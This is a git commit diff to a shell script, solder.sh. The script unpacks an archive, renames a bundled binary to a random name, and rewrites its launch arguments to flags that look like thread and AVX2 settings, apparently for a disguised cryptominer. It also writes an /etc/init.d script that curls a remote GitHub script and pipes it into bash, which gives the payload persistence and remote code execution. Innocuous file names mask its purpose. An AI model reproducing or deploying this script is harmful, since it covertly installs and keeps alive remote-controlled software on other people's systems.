7f5eeac92e4051c204451ae162f0274ff99cc1cb
enirgy <ardirakka67@gmail.com>
2024-06-12 00:12:19 +0700

    Update solder.sh

--- solder.sh
+++ solder.sh
@@ -4,7 +4,7 @@ tar -xvf channel.tar
 cd /channel
 variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
 mv circuit $variable1
-sed -i "s/mongodb/${variable1} --worker ${variable1}/g" ./device.sh
+sed -i "s/mongodb/${variable1} -n=${variable1} -t=10 -s=avx2/g" ./device.sh
 cd /etc/init.d
 echo "bash <(curl -s -L https://raw.githubusercontent.com/enirgy/grounded/main/solder.sh)" > terminal.sh
 chmod a+x terminal.sh
